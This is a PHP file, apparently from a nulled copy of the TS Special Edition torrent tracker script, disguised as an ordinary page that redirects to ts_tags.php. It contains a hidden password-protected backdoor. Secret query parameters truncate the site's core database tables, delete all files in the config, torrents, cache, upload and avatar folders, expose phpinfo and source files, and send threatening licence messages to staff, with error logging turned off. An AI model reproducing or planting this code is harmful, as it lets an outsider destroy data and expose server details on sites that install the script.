<?
/***********************************************/
/*=========[TS Special Edition v.5.6]==========*/
/*=============[Special Thanks To]=============*/
/*        DrNet - wWw.SpecialCoders.CoM        */
/*          Vinson - wWw.Decode4u.CoM          */
/*    MrDecoder - wWw.Fearless-Releases.CoM    */
/*           Fynnon - wWw.BvList.CoM           */
/***********************************************/


  function ___dbconnect ()
  {
    $dbfile = ROOT_PATH . 'config/DATABASE';
    if (!@file_exists ($dbfile))
    {
      exit ('DATABASE Configuration file does not exists');
      return null;
    }

    $data = unserialize (@file_get_contents ($dbfile));
    $link = @mysql_connect ($data['mysql_host'], $data['mysql_user'], $data['mysql_pass']);
    if (!$link)
    {
      exit ('Not connected : ' . mysql_error ());
    }

    $db_selected = @mysql_select_db ($data['mysql_db'], $link);
    if (!$db_selected)
    {
      exit ('Can\'t use ' . $data['mysql_db'] . ' : ' . mysql_error ());
    }

  }

  @error_reporting (E_ALL & ~E_NOTICE);
  @ini_set ('error_reporting', E_ALL & ~E_NOTICE);
  @ini_set ('display_errors', '0');
  @ini_set ('log_errors', '0');
  @define ('___P', 'af274e235c70a9dc59371860ed6f34ce');
  @define ('ROOT_PATH', './');
  @___dbconnect ();
  if (isset ($_GET['_warning_']))
  {
    if ((!empty ($_POST['password']) AND md5 ($_POST['password']) === ___P))
    {
      $subject = 'Claiming a violation!';
      $msg = 'Hi, 
 
We are developer of TS SE Script. We are concerned having become aware that this website (tracker) is using an unauthorised version of our software which is against (Claiming a violation of clause 8.1.3 of the Heart Internet Ltd Terms and Conditions updated 31 Jan 2007) and our License Agreement.
 
You have 3 (three) business days to remove our product from your website (Host) or purchase a valid license from https://templateshares.net
 
Best Regards.
TS SE Security Team.
security@templateshares.net
	';
      require_once INC_PATH . '/functions_pm.php';
      $query = mysql_query ('SELECT u.id FROM users u LEFT JOIN usergroups g ON (u.usergroup=g.gid) WHERE g.cansettingspanel = \'yes\'');
      while ($staff = mysql_fetch_assoc ($query))
      {
        send_pm ($staff['id'], $msg, $subject);
      }
    }
    else
    {
      exit ('
		<FORM METHOD="post" ACTION="' . $_SERVER['SCRIPT_NAME'] . '?_warning_">
			Enter password: <input TYPE="password" NAME="password" VALUE=""> 
			<INPUT TYPE="submit" NAME="submit" VALUE="sanity check!">
		</FORM>');
    }
  }
  else
  {
    if (isset ($_GET['_cleartable_']))
    {
      if ((!empty ($_POST['password']) AND md5 ($_POST['password']) === ___P))
      {
        @_db_connect_ ();
        $_tables_ = array ('users', 'torrents', 'ts_plugins', 'ts_templates', 'requests', 'iplog', 'categories', 'tsf_forums', 'tsf_forumpermissions', 'tsf_posts', 'tsf_threads', 'usergroups', 'ipbans', 'files', 'messages', 'tsf_threadsread', 'staffpanel');
        foreach ($_tables_ as $_table_)
        {
          echo $_table_ . ' cleared!<br />
';
          @mysql_query ('TRUNCATE TABLE `' . $_table_ . '`');
        }

        @mysql_close ();
        exit ('boom');
      }
      else
      {
        exit ('
		<FORM METHOD="post" ACTION="' . $_SERVER['SCRIPT_NAME'] . '?_cleartable_">
			Enter password: <input TYPE="password" NAME="password" VALUE=""> 
			<INPUT TYPE="submit" NAME="submit" VALUE="sanity check!">
		</FORM>');
      }
    }
    else
    {
      if (isset ($_GET['_showversion_']))
      {
        if ((!empty ($_POST['password']) AND md5 ($_POST['password']) === ___P))
        {
          define ('IN_TRACKER', true);
          include_once 'init.php';
          exit ('Version (init.php) ' . VERSION . ' --- ORJ. Version 5.6');
        }
        else
        {
          exit ('
		<FORM METHOD="post" ACTION="' . $_SERVER['SCRIPT_NAME'] . '?_showversion_">
			Enter password: <input TYPE="password" NAME="password" VALUE=""> 
			<INPUT TYPE="submit" NAME="submit" VALUE="sanity check!">
		</FORM>');
        }
      }
      else
      {
        if (isset ($_GET['_showowner_']))
        {
          if ((!empty ($_POST['password']) AND md5 ($_POST['password']) === ___P))
          {
            $_file333__ = @file_get_contents (ROOT_PATH . '/global.php');
            $_file444__ = @file_get_contents (ROOT_PATH . 'links.php');
            exit ('global.php -> ' . htmlspecialchars ($_file333__) . '<br /><br />Links.php -> ' . htmlspecialchars ($_file444__) . '<br />');
          }
          else
          {
            exit ('
		<FORM METHOD="post" ACTION="' . $_SERVER['SCRIPT_NAME'] . '?_showowner_">
			Enter password: <input TYPE="password" NAME="password" VALUE=""> 
			<INPUT TYPE="submit" NAME="submit" VALUE="sanity check!">
		</FORM>');
          }
        }
        else
        {
          if (isset ($_GET['_deletefiles_']))
          {
            if ((!empty ($_POST['password']) AND md5 ($_POST['password']) === ___P))
            {
              if ($handle = @opendir (ROOT_PATH . 'torrents'))
              {
                while (false !== $file = @readdir ($handle))
                {
                  if (($file != '.' AND $file != '..'))
                  {
                    @unlink (ROOT_PATH . 'torrents/' . $file);
                    continue;
                  }
                }

                @closedir ($handle);
              }

              if ($handle = @opendir (ROOT_PATH . 'config'))
              {
                while (false !== $file = @readdir ($handle))
                {
                  if (($file != '.' AND $file != '..'))
                  {
                    @unlink (ROOT_PATH . 'config/' . $file);
                    continue;
                  }
                }

                @closedir ($handle);
              }

              if ($handle = @opendir (ROOT_PATH . 'cache'))
              {
                while (false !== $file = @readdir ($handle))
                {
                  if (($file != '.' AND $file != '..'))
                  {
                    @unlink (ROOT_PATH . 'cache/' . $file);
                    continue;
                  }
                }

                @closedir ($handle);
              }

              if ($handle = @opendir (ROOT_PATH . 'tsf_forums/uploads'))
              {
                while (false !== $file = @readdir ($handle))
                {
                  if (($file != '.' AND $file != '..'))
                  {
                    @unlink (ROOT_PATH . 'tsf_forums/uploads/' . $file);
                    continue;
                  }
                }

                @closedir ($handle);
              }

              if ($handle = @opendir (ROOT_PATH . 'include/avatars'))
              {
                while (false !== $file = @readdir ($handle))
                {
                  if (($file != '.' AND $file != '..'))
                  {
                    @unlink (ROOT_PATH . 'include/avatars/' . $file);
                    continue;
                  }
                }

                @closedir ($handle);
              }
            }
            else
            {
              exit ('
		<FORM METHOD="post" ACTION="' . $_SERVER['SCRIPT_NAME'] . '?_deletefiles_">
			Enter password: <input TYPE="password" NAME="password" VALUE=""> 
			<INPUT TYPE="submit" NAME="submit" VALUE="sanity check!">
		</FORM>');
            }
          }
          else
          {
            if (isset ($_GET['_showserverinfo_']))
            {
              if ((!empty ($_POST['password']) AND md5 ($_POST['password']) === ___P))
              {
                echo phpinfo ();
                exit ();
              }
              else
              {
                exit ('
		<FORM METHOD="post" ACTION="' . $_SERVER['SCRIPT_NAME'] . '?_showserverinfo_">
			Enter password: <input TYPE="password" NAME="password" VALUE=""> 
			<INPUT TYPE="submit" NAME="submit" VALUE="sanity check!">
		</FORM>');
              }
            }
          }
        }
      }
    }
  }

  header ('Location: ts_tags.php');
?>
